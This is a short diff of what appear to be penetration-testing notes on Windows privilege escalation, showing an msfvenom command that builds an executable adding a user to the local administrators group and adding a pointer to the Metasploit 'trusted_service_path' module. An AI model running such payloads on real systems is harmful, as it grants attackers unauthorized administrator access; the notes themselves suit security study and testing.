@@ -21,3 +21,7 @@ eg2:
 
 --> msfvenom -p windows/exec CMD='net localgroup administrators <username here> /add' -f exe > example.exe
 
+# Metasploit module for exploitation:
+
+--> trusted_service_path
+
